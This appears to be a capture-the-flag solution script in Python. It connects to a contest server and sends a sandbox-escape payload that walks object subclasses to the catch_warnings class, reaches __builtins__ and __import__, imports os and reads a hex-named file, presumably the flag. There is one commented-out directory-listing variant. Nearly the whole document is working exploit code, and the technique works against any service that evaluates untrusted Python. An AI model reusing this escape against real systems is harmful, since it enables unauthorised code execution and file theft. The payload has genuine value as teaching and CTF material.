import socket
import time
import datetime

s = socket.socket()
s.connect(('python.contest.qctf.ru',1337))
e = """
#[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').listdir('./')
[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').read([x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').open('159fe327e79316e0f9169fa326fafbd1.txt',[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').O_RDONLY),999999)
"""
s.send(e)
print(s.recv(8000))
s.close()
